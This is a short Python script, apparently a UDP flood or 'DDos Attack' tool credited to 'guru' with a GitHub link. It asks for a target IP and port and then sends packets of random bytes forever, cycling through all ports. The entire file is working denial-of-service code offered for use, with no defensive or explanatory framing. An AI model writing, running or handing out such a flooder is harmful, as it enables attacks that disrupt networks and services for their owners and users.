
import socket
import random
import time
import os
from datetime import datetime

# Get the current date and time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)  # Random bytes for sending

# Clear the terminal screen and display title
os.system("clear")
os.system("figlet DDos Attack")  # You need to have figlet installed for this to work
print()
print("Author   : guru")
print("github   : https://github.com/whitedevil0420/d-ddos2.git")
print()

# Get IP and port from user input
ip = input("IP Target : ")
port = int(input("Port       : "))

# Clear the terminal again and show progress
os.system("clear")
os.system("figlet Attack Starting")
print("[   starting ..... ] 100% ")
# Sending packets continuously
sent = 0
while True:
    sock.sendto(bytes, (ip, port))  # Send data to the target IP and port
    sent += 1
    port += 1  # Increment port number
    print(f"Sent {sent} packet(s) to {ip} through port:{port}")
    
    if port == 65534:  # Reset the port after 65534
        port = 1
